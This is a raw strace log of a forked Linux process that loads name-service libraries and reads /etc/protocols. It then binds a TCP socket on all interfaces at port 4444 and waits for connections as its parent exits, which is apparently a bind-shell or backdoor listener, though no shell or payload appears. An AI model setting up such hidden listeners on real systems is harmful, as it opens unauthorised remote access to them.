18439 12:54:35.930230 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d91908) = 18440
18440 12:54:35.936399 getppid()         = 18439
18440 12:54:35.936852 open("/etc/nsswitch.conf", O_RDONLY) = 7
18440 12:54:35.936877 fstat64(7, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
18440 12:54:35.936897 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f57000
18440 12:54:35.936911 read(7, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
18440 12:54:35.936961 read(7, "", 4096) = 0
18440 12:54:35.936972 close(7)          = 0
18440 12:54:35.936982 munmap(0xb7f57000, 4096) = 0
18440 12:54:35.937009 open("/etc/ld.so.cache", O_RDONLY) = 7
18440 12:54:35.937022 fstat64(7, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
18440 12:54:35.937039 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7d5e000
18440 12:54:35.937051 close(7)          = 0
18440 12:54:35.937062 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18440 12:54:35.937079 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937094 stat64("/lib/tls/i686/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937108 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937122 stat64("/lib/tls/i686/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937134 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937147 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
18440 12:54:35.937164 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937177 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
18440 12:54:35.937194 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937206 stat64("/lib/tls/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937217 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937230 stat64("/lib/tls/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937240 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937252 stat64("/lib/tls/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937263 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937275 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
18440 12:54:35.937297 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937310 stat64("/lib/i686/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937321 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937333 stat64("/lib/i686/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937350 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937365 stat64("/lib/i686/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937376 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937388 stat64("/lib/i686", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937399 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937411 stat64("/lib/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937422 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937433 stat64("/lib/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937444 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937456 stat64("/lib/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937466 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937478 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
18440 12:54:35.937494 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937507 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937519 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937532 stat64("/usr/lib/tls/i686/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937544 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937556 stat64("/usr/lib/tls/i686/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937568 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937580 stat64("/usr/lib/tls/i686", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937591 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937604 stat64("/usr/lib/tls/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937615 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937627 stat64("/usr/lib/tls/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937639 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937651 stat64("/usr/lib/tls/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937662 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937674 stat64("/usr/lib/tls", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937685 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937698 stat64("/usr/lib/i686/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937709 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937722 stat64("/usr/lib/i686/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937733 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937746 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
18440 12:54:35.937763 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937778 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
18440 12:54:35.937795 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937808 stat64("/usr/lib/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937819 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937831 stat64("/usr/lib/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937847 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937862 stat64("/usr/lib/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937873 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937885 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
18440 12:54:35.937902 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937916 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937929 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937942 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937954 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937968 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.937980 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.937993 stat64("/lib/i486-linux-gnu/tls/i686", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938005 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938018 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938030 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938043 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938055 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938068 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938080 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938092 stat64("/lib/i486-linux-gnu/tls", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938104 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938117 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938129 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938142 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938154 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938167 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938179 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938192 stat64("/lib/i486-linux-gnu/i686", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938204 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938217 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938232 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938245 stat64("/lib/i486-linux-gnu/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938256 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938269 stat64("/lib/i486-linux-gnu/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938281 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938293 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
18440 12:54:35.938311 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938325 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938342 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938358 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938371 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938384 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938397 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938410 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938422 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938436 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938449 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938462 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938474 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938487 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938500 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938512 stat64("/usr/lib/i486-linux-gnu/tls", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938524 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938538 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938550 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938564 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938576 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938590 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938602 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938614 stat64("/usr/lib/i486-linux-gnu/i686", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938627 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938640 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938652 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938665 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938680 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938693 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbff7840c) = -1 ENOENT (No such file or directory)
18440 12:54:35.938705 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
18440 12:54:35.938718 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
18440 12:54:35.938739 munmap(0xb7d5e000, 29913) = 0
18440 12:54:35.938760 open("/etc/ld.so.cache", O_RDONLY) = 7
18440 12:54:35.938773 fstat64(7, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
18440 12:54:35.938789 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7d5e000
18440 12:54:35.938800 close(7)          = 0
18440 12:54:35.938811 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18440 12:54:35.938826 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 7
18440 12:54:35.938849 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
18440 12:54:35.938941 fstat64(7, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
18440 12:54:35.938963 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7d53000
18440 12:54:35.938975 mmap2(0xb7d5c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x8) = 0xb7d5c000
18440 12:54:35.938992 close(7)          = 0
18440 12:54:35.939016 munmap(0xb7d5e000, 29913) = 0
18440 12:54:35.939033 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 7
18440 12:54:35.939049 fcntl64(7, F_GETFD) = 0x1 (flags FD_CLOEXEC)
18440 12:54:35.939064 fstat64(7, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
18440 12:54:35.939081 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d65000
18440 12:54:35.939092 read(7, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
18440 12:54:35.939283 close(7)          = 0
18440 12:54:35.939294 munmap(0xb7d65000, 4096) = 0
18440 12:54:35.939311 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 7
18440 12:54:35.939325 fstat64(7, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
18440 12:54:35.939351 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d65000
18440 12:54:35.939363 read(7, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
18440 12:54:35.939543 close(7)          = 0
18440 12:54:35.939553 munmap(0xb7d65000, 4096) = 0
18440 12:54:35.939580 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 7
18440 12:54:35.939602 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff78918) = -1 EINVAL (Invalid argument)
18440 12:54:35.939615 _llseek(7, 0, 0xbff78960, SEEK_CUR) = -1 ESPIPE (Illegal seek)
18440 12:54:35.939627 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff78918) = -1 EINVAL (Invalid argument)
18440 12:54:35.939638 _llseek(7, 0, 0xbff78960, SEEK_CUR) = -1 ESPIPE (Illegal seek)
18440 12:54:35.939648 fcntl64(7, F_SETFD, FD_CLOEXEC) = 0
18440 12:54:35.939700 setsockopt(7, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
18440 12:54:35.939736 bind(7, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
18440 12:54:35.939762 listen(7, 5)      = 0
18440 12:54:35.939817 accept(7,  <unfinished ...>
18439 12:54:35.940069 exit_group(0)     = ?
